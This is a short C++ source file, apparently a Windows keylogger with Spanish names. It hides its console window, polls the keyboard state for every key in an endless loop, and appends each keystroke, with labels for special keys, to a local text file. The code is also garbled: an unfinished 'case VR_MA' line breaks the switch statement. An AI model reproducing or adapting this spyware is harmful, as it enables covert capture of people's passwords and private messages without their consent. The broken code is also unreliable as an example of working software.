#include<Windows.h>
#include<iostream>
#include<fstream>
#include<string>
#include<conio.h>
 
using namespace std;
 
void EscribirArchivo(LPCSTR texto)
{
    ofstream archivo;
    archivo.open("texto.txt", fstream::app);
    archivo << texto;
    archivo.close();
}
 
bool TeclasPulsadas(int tecla)
{
    switch (tecla)
    {
        case VK_SPACE:
            cout << " ";
            EscribirArchivo(" ");
            break;
        case VK_RETURN:
            cout << "\n";
            EscribirArchivo(" {INTRO} ");
            break;
        case VK_SHIFT:
            cout << " {SHIFT} ";
            EscribirArchivo(" {SHIFT} ");
            break;
        case VK_BACK:
            cout << " {RETROCESO} ";
            EscribirArchivo(" {RETROCESO} ");
            break;
        case VK_END:
            cout << " {END} ";
            EscribirArchivo(" {END} ");
            break;
        case VR_MA    
 
        default: return false;
    }
}
 
int main()
{
    FreeConsole();
    unsigned char key;
    while (TRUE)
    {
        Sleep(10);
        for (key = 8; key <= 255; key++)
        {
            if (GetAsyncKeyState(key) == -32767)
            {
                if(TeclasPulsadas(key) == FALSE)
                {
                    cout << key;
                    ofstream archivo;
                    archivo.open("texto.txt", fstream::app);
                    archivo << key;
                    archivo.close();
                }
            }
        }
    }
}